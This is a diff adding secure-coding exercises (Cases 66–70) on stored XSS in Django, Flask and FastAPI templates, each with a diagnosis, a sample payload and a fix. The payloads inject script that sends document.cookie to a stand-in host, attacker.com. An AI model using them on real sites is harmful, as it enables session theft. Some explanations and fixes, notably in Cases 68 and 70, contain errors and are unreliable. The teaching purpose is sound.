@@ -6116,4 +6116,457 @@ def event_banner(request, event_id):
 </section>
 ```
 
-1. 
+1. Stored XSS. Missing Escaping for the `sponsor.html` argument
+
+in `format.html`.
+
+2. Below is a sample payload:
+
+```
+sponsor.html: </p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>
+```
+
+
+3. Below is the sample fix:
+
+ 
+```
+# views.py
+from django.shortcuts import render
+from django.utils.html import format_html
+from django.utils.safestring import mark_safe
+from .models import Event
+
+def event_banner(request, event_id):
+	event = Event.objects.get(id=event_id)
+
+	return render(request, 'event.html', {
+		'title': event.title,
+		'sponsor': event.sponsor_name
+	})
+```
+
+```
+{# event.html #}
+<section class="event-section">
+	<div class="banner">
+	<h2>{{ title }}</h2>
+	<p>Sponsored by: {{ sponsor }}</p>
+	</div>
+</section>
+```
+
+Case 67:
+
+```
+# views.py
+from flask import render_template
+from .models import Review
+
+def review_page(review_id):
+	review = Review.query.get(review_id)
+	return render_template('review.html',
+		author=review.author,
+		body=review.body,
+	)
+```
+
+```
+{# review.html #}
+<div class="review">
+	<p id="review-body"></p>
+</div>
+
+<script>
+	var author = "{{ author | tojson }}";
+	var body   = {{ body | tojson }};
+
+	function renderReview() {
+		var container = document.getElementById('review-body');
+		container.innerHTML = "<strong>" + author + "</strong>: " + body;
+	}
+
+	renderReview();
+</script>
+```
+
+1. Stored XSS. Wrong Context Escaping. Unnecessary enclosing of
+
+`{{ author | tojson }}` in double quotes since `tojson` does this
+
+automatically. Remember `tojson` is used for Javascript-context
+
+escaping in popular frameworks such as Flask and FastAPI. Even
+
+after removing the enclosed doubled quotes the `innerHTML` in
+
+the frontend template still leaves the code vulnerable to XSS.
+
+So the `innerHTML` has to be replaced with escaped HTML content.
+
+2. Below is a sample payload:
+
+```
+author: </strong><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie);"><strong>
+```
+
+{::comment}
+</strong>
+{:comment}
+
+3. Below is the fix:
+
+```
+# views.py
+from flask import render_template
+from .models import Review
+
+def review_page(review_id):
+	review = Review.query.get(review_id)
+	return render_template('review.html',
+		author=review.author,
+		body=review.body,
+	)
+```
+
+```
+{# review.html #}
+<div class="review">
+	<p id="review-body"></p>
+</div>
+
+<script>
+	var author = {{ author | tojson }};
+	var body   = {{ body | tojson }};
+
+	function renderReview() {
+
+		var container = document.getElementById('review-body');
+
+		const authorname = document.createElement('strong');
+
+		authorname.textContent = author;
+
+		const bodytext = document.createTextNode(`: ${body}`);
+
+		container.appendChild(authorname);
+
+		container.appendChild(bodytext);
+
+	}
+
+	renderReview();
+</script>
+```
+
+Case 68:
+
+```
+# views.py
+from django.shortcuts import render
+from django.utils.html import format_html
+from django.utils.safestring import mark_safe
+from .models import UserProfile
+
+def profile_badge(request, user_id):
+	profile = UserProfile.objects.get(id=user_id)
+
+	location = format_html('<em>{}</em>', profile.location)
+
+	bio_preview = mark_safe(
+		profile.bio[:100] if len(profile.bio) > 100
+		else profile.bio
+	)
+
+	return render(request, 'profile_badge.html', {
+		'username': profile.username,
+		'location': location,
+		'bio_preview': bio_preview,
+	})
+```
+
+```
+{# profile_badge.html #}
+<div class="badge">
+	<h3>{{ username }}</h3>
+	<p>{{ location }}</p>
+	<p>{{ bio_preview }}</p>
+</div>
+```
+
+1. Stored XSS. Missing escaping for `bio_preview`. The `mark_safe()`
+
+tells Django that `bio_preview` is safe for HTML execution provided
+
+the input is larger than 100 characters (Why would the developer
+
+do that?).
+
+2. Below is a sample payload:
+
+```
+bio_preview: </p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p></p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>
+```
+
+3. Below is the fix:
+
+```
+# views.py
+from django.shortcuts import render
+from .models import UserProfile
+
+def profile_badge(request, user_id):
+	
+	profile = UserProfile.objects.get(id=user_id)
+
+	return render(request, 'profile_badge.html', {
+		'username': profile.username,
+		'location': profile.location,
+		'bio_preview': profile.bio,
+	})
+```
+
+```
+{# profile_badge.html #}
+<div class="badge">
+	<h3>{{ username }}</h3>
+	<p><em>{{ location }}</em></p>
+	<p>{{ bio_preview }}</p>
+</div>
+```
+
+Case 69:
+
+```
+# main.py
+from fastapi import FastAPI, Request
+from fastapi.templating import Jinja2Templates
+from .models import get_post_by_id
+
+app = FastAPI()
+templates = Jinja2Templates(directory="templates")
+
+@app.get("/post/{post_id}")
+async def post_detail(request: Request, post_id: int):
+	post = get_post_by_id(post_id)
+	return templates.TemplateResponse("post.html", {
+		"request": request,
+		"title":   post.title,
+		"author":  post.author,
+		"tags":    post.tags,
+	})
+```
+
+```
+{# post.html #}
+<div id="post-header"></div>
+<div id="tag-list"></div>
+
+<script>
+	var title  = "{{ title | tojson }}";
+	var author = {{ author | tojson }};
+	var tags   = {{ tags | tojson }};
+
+	function renderHeader() {
+		document.getElementById('post-header').innerHTML =
+			'<h1>' + title + '</h1>' +
+			'<p>By: ' + author + '</p>';
+	}
+
+	function renderTags() {
+		var html = '';
+		tags.forEach(function(tag) {
+			html += '<span class="tag">' + tag + '</span>';
+		});
+		document.getElementById('tag-list').innerHTML = html;
+	}
+
+	renderHeader();
+	renderTags();
+</script>
+```
+
+1. Stored XSS. Wrong Context Escaping in initializtion of `title`.
+
+Also Missing Escaping for DOM sink in both `renderHeader()` and
+
+`renderTags()`.
+
+2. Below are sample payloads:
+
+```
+title: </h1><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><h1>
+author: </p><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><p>
+tag: </span><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><span>
+```
+
+{::comment}
+</span>
+{:comment}
+
+3. Below is the fix:
+
+```
+# main.py
+from fastapi import FastAPI, Request
+from fastapi.templating import Jinja2Templates
+from .models import get_post_by_id
+
+app = FastAPI()
+templates = Jinja2Templates(directory="templates")
+
+@app.get("/post/{post_id}")
+async def post_detail(request: Request, post_id: int):
+	post = get_post_by_id(post_id)
+	return templates.TemplateResponse("post.html", {
+		"request": request,
+		"title":   post.title,
+		"author":  post.author,
+		"tags":    post.tags,
+	})
+```
+
+```
+{# post.html #}
+<div id="post-header"></div>
+<div id="tag-list"></div>
+
+<script>
+	var title  = {{ title | tojson }};
+	var author = {{ author | tojson }};
+	var tags   = {{ tags | tojson }};
+
+	function renderHeader() {
+
+		const postheader = document.getElementById('post-header');
+
+		const titlehead = document.createElement('h1');
+
+		titlehead.textContent = `${title}`;
+
+		const authorp = document.createElement('p');
+
+		authorp.textContent = `By: ${author}`;
+
+		postheader.appendChild(titlehead);		
+		
+		postheader.appendChild(authorp);		
+
+	}
+
+	function renderTags() {
+
+		const taglist = document.getElementById('tag-list');
+
+		tags.forEach(function(tag) {
+
+			const spantag = document.createElement('span');
+		
+			spantag.className = "tag";
+
+			spantag.textContent = tag;
+
+			taglist.appendChild(spantag);
+
+		});
+		
+	}
+
+	renderHeader();
+
+	renderTags();
+</script>
+```
+
+Case 70:
+
+```
+# views.py
+from django.shortcuts import render
+from django.utils.html import escape
+from django.http import JsonResponse
+from .models import Comment
+
+def submit_comment(request):
+	if request.method == 'POST':
+		body = request.POST.get('body', '')
+		safe_body = escape(body)
+		Comment.objects.create(
+			user=request.user,
+			body=safe_body,
+		)
+	return redirect('comment_list')
+
+
+def comment_list(request):
+	comments = Comment.query.order_by(
+		Comment.created_at.desc()
+	).all()
+	return render(request, 'comments.html', {
+		'comments': comments,
+	})
+
+
+def comment_api(request):
+	comments = Comment.objects.all().values('user__username', 'body')
+	return JsonResponse({'comments': list(comments)})
+```
+
+```
+{# comments.html #}
+{% for comment in comments %}
+	<div class="comment">
+		<p>{{ comment.body }}</p>
+	</div>
+{% endfor %}
+```
+1. Stored XSS. 
+
+Also HTML escaping in the backend for `escape(body)` causes
+
+display issues in the frontend.
+
+2. No relevant payload:
+
+
+3. Below is the bug fix:
+
+```
+# views.py
+from django.shortcuts import render
+from django.http import JsonResponse
+from .models import Comment
+
+def submit_comment(request):
+	if request.method == 'POST':
+		request_body = request.POST.get('body', '')
+		Comment.objects.create(
+			user=request.user,
+			body=request_body,
+		)
+	return redirect('comment_list')
+
+
+def comment_list(request):
+	comments = Comment.query.order_by(
+		Comment.created_at.desc()
+	).all()
+	return render(request, 'comments.html', {
+		'comments': comments,
+	})
+
+
+def comment_api(request):
+	comments = Comment.objects.all().values('user__username', 'body')
+
+	return JsonResponse({'comments': list(comments)})
+```
+
+```
+{# comments.html #}
+{% for comment in comments %}
+	<div class="comment">
+		<p>{{ comment.body }}</p>
+	</div>
+{% endfor %}
+```
